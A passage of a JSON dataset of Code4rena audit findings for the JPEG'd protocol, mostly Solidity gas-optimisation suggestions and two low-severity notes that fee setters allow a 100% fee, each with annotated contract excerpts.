      "content": "\nSee `@audit` tag:\n\n```solidity\n68:     function unlock(uint256 _nftIndex) external nonReentrant {\n69:         LockPosition memory position = positions[_nftIndex]; //@audit gas: costing 3 SLOADs while only lockAmount is needed twice. Replace \"memory\" with \"storage\" and cache only position.lockAmount \n70:         require(position.owner == msg.sender, \"unauthorized\");\n71:         require(position.unlockAt <= block.timestamp, \"locked\");\n72: \n73:         delete positions[_nftIndex];\n74: \n75:         jpeg.safeTransfer(msg.sender, position.lockAmount);\n76: \n77:         emit Unlock(msg.sender, _nftIndex, position.lockAmount);\n78:     }\n```\n\nHere, a copy in memory is costing 3 SLOADs and 3 MSTORES. The, 2 variables are only read once through MLOAD (`position.owner` and `position.unlockAt`) and one is read twice (`position.lockAmount`).\nI suggest replacing the `memory` keyword with `storage` at L69 and only copying `position.lockAmount` in memory.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-07-jpeglockunlock-use-storage-instead-of-copying-struct-in-memory-l69",
      "tags": [],
      "finders": []
    },
    {
      "id": "5316",
      "title": "[G-06] `yVaultLPFarming._withdrawReward()`: `accRewardPerShare` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n177:     function _withdrawReward(address account) internal returns (uint256) {\n178:         uint256 pending = (balanceOf[account] *\n179:             (accRewardPerShare - userLastAccRewardPerShare[account])) / 1e36; //@audit gas: SLOAD 1 accRewardPerShare\n180: \n181:         if (pending > 0) userPendingRewards[account] += pending;\n182: \n183:         userLastAccRewardPerShare[account] = accRewardPerShare; //@audit gas: SLOAD 2 accRewardPerShare\n184: \n185:         return pending;\n186:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-06-yvaultlpfarming_withdrawreward-accrewardpershare-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5315",
      "title": "[G-05] `yVaultLPFarming.withdraw()`: L124 should be unchecked due to L119",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n117:     function withdraw(uint256 _amount) external noContract(msg.sender) {\n118:         require(_amount > 0, \"invalid_amount\");\n119:         require(balanceOf[msg.sender] >= _amount, \"insufficient_amount\");\n120: \n121:         _update();\n122:         _withdrawReward(msg.sender);\n123: \n124:         balanceOf[msg.sender] -= _amount;  //@audit gas: should be unchecked (can't underflow due to L119)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-05-yvaultlpfarmingwithdraw-l124-should-be-unchecked-due-to-l119",
      "tags": [],
      "finders": []
    },
    {
      "id": "5314",
      "title": "[G-04] `LPFarming._withdrawReward()`: `poolInfo[_pid].accRewardPerShare` should get cached",
      "impact": "GAS",
      "content": "\nThe code can be optimized by minimising the number of SLOADs. SLOADs are expensive (100 gas) compared to MLOADs/MSTOREs (3 gas). Here, the storage value should get cached in memory (see the `@audit` tags for further details):\n\n```solidity\n315:     function _withdrawReward(uint256 _pid) internal returns (uint256) {\n316:         UserInfo storage user = userInfo[_pid][msg.sender];\n317:         uint256 pending = (user.amount *\n318:             (poolInfo[_pid].accRewardPerShare - user.lastAccRewardPerShare)) / //@audit gas: SLOAD 1 poolInfo[_pid].accRewardPerShare\n319:             1e36;\n320:         if (pending > 0) {\n321:             userRewards[msg.sender] += pending;\n322:         }\n323: \n324:         user.lastAccRewardPerShare = poolInfo[_pid].accRewardPerShare; //@audit gas: SLOAD 2 poolInfo[_pid].accRewardPerShare\n325: \n326:         return pending;\n327:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-04-lpfarming_withdrawreward-poolinfo_pidaccrewardpershare-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5313",
      "title": "[G-03] `LPFarming.withdraw()`: L248 should be unchecked due to L243",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n235:     function withdraw(uint256 _pid, uint256 _amount)\n236:         external\n237:         noContract(msg.sender)\n238:     {\n239:         require(_amount > 0, \"invalid_amount\");\n240: \n241:         PoolInfo storage pool = poolInfo[_pid];\n242:         UserInfo storage user = userInfo[_pid][msg.sender];\n243:         require(user.amount >= _amount, \"insufficient_amount\");\n244: \n245:         _updatePool(_pid);\n246:         _withdrawReward(_pid);\n247: \n248:         user.amount -= _amount;  //@audit gas: should be unchecked (can't underflow due to L243)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-03-lpfarmingwithdraw-l248-should-be-unchecked-due-to-l243",
      "tags": [],
      "finders": []
    },
    {
      "id": "5312",
      "title": "[G-02] `LPFarming.newEpoch()`: L128 and L133 should be unchecked due to parent if/else condition",
      "impact": "GAS",
      "content": "\nSolidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an `unchecked` block: <https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic>\n\nI suggest wrapping with an `unchecked` block here (see `@audit` tag):\n\n```solidity\n107:     function newEpoch(\n...\n111:     ) external onlyOwner {\n127:         if (remainingRewards > newRewards) {\n128:             jpeg.safeTransfer(msg.sender, remainingRewards - newRewards);  //@audit gas: should be unchecked (can't underflow due to L127)\n129:         } else if (remainingRewards < newRewards) {\n130:             jpeg.safeTransferFrom(\n131:                 msg.sender,\n132:                 address(this),\n133:                 newRewards - remainingRewards  //@audit gas: should be unchecked (can't underflow due to L129)\n134:             );\n135:         }\n136:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-02-lpfarmingnewepoch-l128-and-l133-should-be-unchecked-due-to-parent-ifelse-condition",
      "tags": [],
      "finders": []
    },
    {
      "id": "5311",
      "title": "[G-01] `NFTEscrow._executeTransfer()`: Cheap Contract Deployment Through Clones",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n67:     function _executeTransfer(address _owner, uint256 _idx) internal {\n68:         (bytes32 salt, ) = precompute(_owner, _idx);\n69:         new FlashEscrow{salt: salt}( //@audit gas: deployment can cost less through clones \n70:             nftAddress,\n71:             _encodeFlashEscrowPayload(_idx)\n72:         );\n73:     }\n```\n\nThere's a way to save a significant amount of gas on deployment using Clones: <https://www.youtube.com/watch?v=3Mw-pMmJ7TA> .\n\nThis is a solution that was adopted, as an example, by Porter Finance. They realized that deploying using clones was 10x cheaper:\n\n*   <https://github.com/porter-finance/v1-core/issues/15#issuecomment-1035639516>\n*   <https://github.com/porter-finance/v1-core/pull/34>\n\nI suggest applying a similar pattern.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-01-nftescrow_executetransfer-cheap-contract-deployment-through-clones",
      "tags": [],
      "finders": []
    },
    {
      "id": "5310",
      "title": "[L-06] Fee in",
      "impact": "LOW",
      "content": "<h2 id=\"l-06-fee-in-nftvaultsetorganizationfeerateshould-be-upper-bounded\" style=\"position:relative;\"><a href=\"#l-06-fee-in-nftvaultsetorganizationfeerateshould-be-upper-bounded\" aria-label=\"l 06 fee in nftvaultsetorganizationfeerateshould be upper bounded permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-06] Fee in <code>NFTVault.setOrganizationFeeRate()</code>should be upper-bounded</h2>\n<p>See <code>@audit</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">290</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setOrganizationFeeRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Rate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_organizationFeeRate</span><span class=\"mtk1\">)  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">291:         </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">292:         </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DAO_ROLE</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">293:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">294</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">_validateRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_organizationFeeRate</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">295</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">organizationFeeRate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_organizationFeeRate</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit low: fee can be 100%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">296</span><span class=\"mtk1\">:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">400</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_validateRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Rate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rate</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">401</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">402</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">rate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">rate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">rate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">,  </span><span class=\"mtk3\">//@audit low: fee can be 100% (rate.denominator == rate.numerator)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">403</span><span class=\"mtk1\">:             </span><span class=\"mtk8\">\"invalid_rate\"</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">404</span><span class=\"mtk1\">:         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">405</span><span class=\"mtk1\">:     }</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#l-06-fee-in-nftvaultsetorganizationfeerateshould-be-upper-bounded",
      "tags": [],
      "finders": []
    },
    {
      "id": "5309",
      "title": "[L-05] Fee in",
      "impact": "LOW",
      "content": "<h2 id=\"l-05-fee-in-strategypusdconvexsetperformancefee-should-be-upper-bounded\" style=\"position:relative;\"><a href=\"#l-05-fee-in-strategypusdconvexsetperformancefee-should-be-upper-bounded\" aria-label=\"l 05 fee in strategypusdconvexsetperformancefee should be upper bounded permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-05] Fee in <code>StrategyPUSDConvex.setPerformanceFee()</code> should be upper-bounded</h2>\n<p>See <code>@audit</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">177</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPerformanceFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Rate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">178:         </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">179:         </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DEFAULT_ADMIN_ROLE</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">180:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">183</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">.</span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">184</span><span class=\"mtk1\">:             </span><span class=\"mtk8\">\"INVALID_RATE\"</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">:         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">186</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">performanceFee</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit low: fee can be 100% (_performanceFee.denominator == _performanceFee.numerator)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">187</span><span class=\"mtk1\">:     }</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#l-05-fee-in-strategypusdconvexsetperformancefee-should-be-upper-bounded",
      "tags": [],
      "finders": []
    },
    {
      "id": "4444",
      "title": "[G-43] Use Custom Errors instead of Revert Strings to save Gas",
      "impact": "GAS",
      "content": "\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)\n\nSource: <https://blog.soliditylang.org/2021/04/21/custom-errors/>:\n\n> Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\n\nCustom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).\n\nSee [original submission](https://github.com/code-423n4/2022-04-jpegd-findings/issues/121) for instances.\n\n**[spaghettieth (JPEG'd) confirmed and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/121#issuecomment-1098310851):**\n > Very high quality report, may implement some of your suggestions. Thank you!\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/121#issuecomment-1105050319):**\n > Implemented most of your suggestions in [jpegd/core#21](https://github.com/jpegd/core/pull/21). Custom errors have not been implemented as it would be too big of a change at this point and doing it properly may cause unexpected behaviour/bugs due to the codebase changing too much.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-43-use-custom-errors-instead-of-revert-strings-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4443",
      "title": "[G-42] Reduce the size of error messages (Long revert Strings)",
      "impact": "GAS",
      "content": "\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.\n\nRevert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.\n\nRevert strings > 32 bytes:\n\n```solidity\ntokens/JPEG.sol:23:            \"JPEG: must have minter role to mint\"\ntokens/StableCoin.sol:41:            \"StableCoin: must have minter role to mint\"\ntokens/StableCoin.sol:55:            \"StableCoin: must have pauser role to pause\"\ntokens/StableCoin.sol:69:            \"StableCoin: must have pauser role to unpause\"\nvaults/NFTVault.sol:394:            \"credit_rate_exceeds_or_equals_liquidation_rate\" \n```\n\nI suggest shortening the revert strings to fit in 32 bytes, or using custom errors as described next.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-42-reduce-the-size-of-error-messages-long-revert-strings",
      "tags": [],
      "finders": []
    },
    {
      "id": "4442",
      "title": "[G-41] Public functions to external",
      "impact": "GAS",
      "content": "\nThe following functions could be set external to save gas and improve code quality.\nExternal call cost is less expensive than of public functions.\n\n```solidity\nwithdraw(IERC20,uint256) should be declared external:\n - Controller.withdraw(IERC20,uint256) (contracts/vaults/yVault/Controller.sol#151-154)\nsetFarmingPool(address) should be declared external:\n - YVault.setFarmingPool(address) (contracts/vaults/yVault/yVault.sol#115-118)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-41-public-functions-to-external",
      "tags": [],
      "finders": []
    },
    {
      "id": "4441",
      "title": "[G-40] Consider making some constants as non-public to save gas",
      "impact": "GAS",
      "content": "\nReducing from `public` to `private` or `internal` can save gas when a constant isn't used outside of its contract.\nI suggest changing the visibility from `public` to `internal` or `private` here:\n\n```solidity\ntokens/JPEG.sol:10:    bytes32 public constant MINTER_ROLE = keccak256(\"MINTER_ROLE\");\ntokens/StableCoin.sol:22:    bytes32 public constant MINTER_ROLE = keccak256(\"MINTER_ROLE\");\ntokens/StableCoin.sol:23:    bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\nvaults/yVault/strategies/StrategyPUSDConvex.sol:66:    bytes32 public constant STRATEGIST_ROLE = keccak256(\"STRATEGIST_ROLE\");\nvaults/yVault/Controller.sol:15:    bytes32 public constant STRATEGIST_ROLE = keccak256(\"STRATEGIST_ROLE\");\nvaults/FungibleAssetVaultForDAO.sol:41:    bytes32 public constant WHITELISTED_ROLE = keccak256(\"WHITELISTED_ROLE\");\nvaults/NFTVault.sol:71:    bytes32 public constant DAO_ROLE = keccak256(\"DAO_ROLE\");\nvaults/NFTVault.sol:72:    bytes32 public constant LIQUIDATOR_ROLE = keccak256(\"LIQUIDATOR_ROLE\");\nvaults/NFTVault.sol:74:    bytes32 public constant CUSTOM_NFT_HASH = keccak256(\"CUSTOM\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-40-consider-making-some-constants-as-non-public-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4440",
      "title": "[G-39] Use `calldata` instead of `memory`",
      "impact": "GAS",
      "content": "\nWhen arguments are read-only on external functions, the data location should be `calldata`:\n\n```solidity\ncontracts/vaults/NFTVault.sol:\n  212:     function setDebtInterestApr(Rate memory _debtInterestApr) //@audit gas: should be calldata\n  222:     function setValueIncreaseLockRate(Rate memory _valueIncreaseLockRate)  //@audit gas: should be calldata\n  232:     function setCreditLimitRate(Rate memory _creditLimitRate)  //@audit gas: should be calldata\n  247:     function setLiquidationLimitRate(Rate memory _liquidationLimitRate)  //@audit gas: should be calldata\n  290:     function setOrganizationFeeRate(Rate memory _organizationFeeRate)  //@audit gas: should be calldata\n  300:     function setInsurancePurchaseRate(Rate memory _insurancePurchaseRate)  //@audit gas: should be calldata\n  311:         Rate memory _insuranceLiquidationPenaltyRate  //@audit gas: should be calldata\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-39-use-calldata-instead-of-memory",
      "tags": [],
      "finders": []
    },
    {
      "id": "4439",
      "title": "[G-38] Increments can be unchecked",
      "impact": "GAS",
      "content": "\nIn Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.\n\n[ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)\n\nInstances include:\n\n```solidity\nfarming/LPFarming.sol:281:        for (uint256 pid = 0; pid < length; ++pid) {\nfarming/LPFarming.sol:348:        for (uint256 i = 0; i < poolInfo.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:145:        for (uint256 i = 0; i < _strategyConfig.rewardTokens.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:231:        for (uint256 i = 0; i < length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:319:            for (uint256 i = 0; i < rewardTokens.length; i++) {\nvaults/NFTVault.sol:181:        for (uint256 i = 0; i < _typeInitializers.length; i++) {\nvaults/NFTVault.sol:184:            for (uint256 j = 0; j < initializer.nfts.length; j++) {\n```\n\nThe code would go from:\n\n```solidity\nfor (uint256 i; i < numIterations; i++) {  \n // ...  \n}  \n```\n\nto:\n\n```solidity\nfor (uint256 i; i < numIterations;) {  \n // ...  \n unchecked { ++i; }  \n}  \n```\n\nThe risk of overflow is inexistant for a `uint256` here.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-38-increments-can-be-unchecked",
      "tags": [],
      "finders": []
    },
    {
      "id": "4437",
      "title": "[G-36] An array's length should be cached to save gas in for-loops",
      "impact": "GAS",
      "content": "\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.\n\nCaching the array length in the stack saves around 3 gas per iteration.\n\nHere, I suggest storing the array's length in a variable before the for-loop, and use it instead:\n\n```solidity\nfarming/LPFarming.sol:348:        for (uint256 i = 0; i < poolInfo.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:145:        for (uint256 i = 0; i < _strategyConfig.rewardTokens.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:319:            for (uint256 i = 0; i < rewardTokens.length; i++) {\nvaults/NFTVault.sol:181:        for (uint256 i = 0; i < _typeInitializers.length; i++) {\nvaults/NFTVault.sol:184:            for (uint256 j = 0; j < initializer.nfts.length; j++) {\n```\n\nThis is already done here:\n\n```solidity\nfarming/LPFarming.sol:281:        for (uint256 pid = 0; pid < length; ++pid) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:231:        for (uint256 i = 0; i < length; i++) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-36-an-arrays-length-should-be-cached-to-save-gas-in-for-loops",
      "tags": [],
      "finders": []
    },
    {
      "id": "4434",
      "title": "[G-33] No need to explicitly initialize variables with default values",
      "impact": "GAS",
      "content": "\nIf a variable is not set/initialized, it is assumed to have the default value (`0` for `uint`, `false` for `bool`, `address(0)` for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas.\n\nAs an example: `for (uint256 i = 0; i < numIterations; ++i) {` should be replaced with `for (uint256 i; i < numIterations; ++i) {`\n\nInstances include:\n\n```solidity\nfarming/LPFarming.sol:281:        for (uint256 pid = 0; pid < length; ++pid) {\nfarming/LPFarming.sol:348:        for (uint256 i = 0; i < poolInfo.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:145:        for (uint256 i = 0; i < _strategyConfig.rewardTokens.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:231:        for (uint256 i = 0; i < length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:319:            for (uint256 i = 0; i < rewardTokens.length; i++) {\nvaults/FungibleAssetVaultForDAO.sol:45:    address internal constant ETH = address(0);\nvaults/NFTVault.sol:181:        for (uint256 i = 0; i < _typeInitializers.length; i++) {\nvaults/NFTVault.sol:184:            for (uint256 j = 0; j < initializer.nfts.length; j++) {\n```\n\nI suggest removing explicit initializations for default values.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-33-no-need-to-explicitly-initialize-variables-with-default-values",
      "tags": [],
      "finders": []
    },
    {
      "id": "4433",
      "title": "[G-32] Upgrade pragma to at least 0.8.4",
      "impact": "GAS",
